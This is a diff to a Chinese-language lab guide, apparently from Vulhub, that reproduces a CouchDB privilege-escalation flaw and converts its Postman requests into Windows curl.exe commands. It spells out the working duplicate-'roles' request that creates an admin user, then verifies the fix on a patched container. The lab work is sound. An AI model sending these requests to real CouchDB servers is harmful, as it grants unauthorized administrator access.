@@ -192,18 +192,13 @@ Windows 下如果 init 容器报 `$'\r': command not found`，说明 `init.sh`
 
 ### 3. 复现
 
-用 Postman 发送第一个请求（正常设置管理员，应该被拒绝）：
+不需要下载 Postman。Postman 只是一个图形化的 HTTP 请求工具，和 curl 的
+作用一样；Windows 自带的 `curl.exe` 已经够用。
 
-```text
-PUT http://127.0.0.1:5984/_users/org.couchdb.user:vulhub
-Content-Type: application/json
+先发第一个请求（正常设置管理员，应该被拒绝）：
 
-{
-  "type": "user",
-  "name": "vulhub",
-  "roles": ["_admin"],
-  "password": "vulhub"
-}
+```bat
+curl.exe -i -X PUT http://127.0.0.1:5984/_users/org.couchdb.user:vulhub -H "Content-Type: application/json" -d "{\"type\":\"user\",\"name\":\"vulhub\",\"roles\":[\"_admin\"],\"password\":\"vulhub\"}"
 ```
 
 结果：
@@ -215,17 +210,8 @@ Content-Type: application/json
 
 再发一个带两个 `roles` 的请求：
 
-```text
-PUT http://127.0.0.1:5984/_users/org.couchdb.user:vulhub
-Content-Type: application/json
-
-{
-  "type": "user",
-  "name": "vulhub",
-  "roles": ["_admin"],
-  "roles": [],
-  "password": "vulhub"
-}
+```bat
+curl.exe -i -X PUT http://127.0.0.1:5984/_users/org.couchdb.user:vulhub -H "Content-Type: application/json" -d "{\"type\":\"user\",\"name\":\"vulhub\",\"roles\":[\"_admin\"],\"roles\":[],\"password\":\"vulhub\"}"
 ```
 
 结果：
@@ -237,7 +223,7 @@ Content-Type: application/json
 登录新用户：
 
 ```bash
-curl -u vulhub:vulhub http://127.0.0.1:5984/_session
+curl.exe -u vulhub:vulhub http://127.0.0.1:5984/_session
 ```
 
 ```json
@@ -247,7 +233,7 @@ curl -u vulhub:vulhub http://127.0.0.1:5984/_session
 再用这个用户创建数据库：
 
 ```bash
-curl -i -u vulhub:vulhub -X PUT http://127.0.0.1:5984/evil_db
+curl.exe -i -u vulhub:vulhub -X PUT http://127.0.0.1:5984/evil_db
 ```
 
 返回 201，说明已经拿到管理员权限。
@@ -274,7 +260,7 @@ docker compose down
 ```bash
 docker run -d --name couchdb-fixed -p 5985:5984 -e COUCHDB_USER=admin -e COUCHDB_PASSWORD=password couchdb:2.1.1
 
-curl -X PUT http://admin:password@127.0.0.1:5985/_users
+curl.exe -X PUT http://admin:password@127.0.0.1:5985/_users
 ```
 
 修复版地址是 `http://127.0.0.1:5985`。
@@ -286,38 +272,26 @@ curl -X PUT http://admin:password@127.0.0.1:5985/_users
 
 再发同样的重复 `roles` 请求：
 
-```text
-PUT http://127.0.0.1:5985/_users/org.couchdb.user:vulhub
-Content-Type: application/json
-
-{
-  "type": "user",
-  "name": "vulhub",
-  "roles": ["_admin"],
-  "roles": [],
-  "password": "vulhub"
-}
+```bat
+curl.exe -i -X PUT http://127.0.0.1:5985/_users/org.couchdb.user:vulhub -H "Content-Type: application/json" -d "{\"type\":\"user\",\"name\":\"vulhub\",\"roles\":[\"_admin\"],\"roles\":[],\"password\":\"vulhub\"}"
 ```
 
 2.1.1 仍然返回 201，但登录后角色是空的：
 
-```json
-{"ok":true,"userCtx":{"name":"vulhub","roles":[]},...}
+```bat
+curl.exe -u vulhub:vulhub http://127.0.0.1:5985/_session
 ```
 
-用这个用户创建数据库会返回 401。
+用这个用户创建数据库会返回 401：
+
+```bat
+curl.exe -i -u vulhub:vulhub -X PUT http://127.0.0.1:5985/newdb
+```
 
 普通用户注册仍然正常：
 
-```text
-PUT http://127.0.0.1:5985/_users/org.couchdb.user:normaluser
-
-{
-  "type": "user",
-  "name": "normaluser",
-  "roles": [],
-  "password": "normalpass"
-}
+```bat
+curl.exe -i -X PUT http://127.0.0.1:5985/_users/org.couchdb.user:normaluser -H "Content-Type: application/json" -d "{\"type\":\"user\",\"name\":\"normaluser\",\"roles\":[],\"password\":\"normalpass\"}"
 ```
 
 返回 201，登录后角色是 `[]`。说明修复后普通功能没有被破坏。
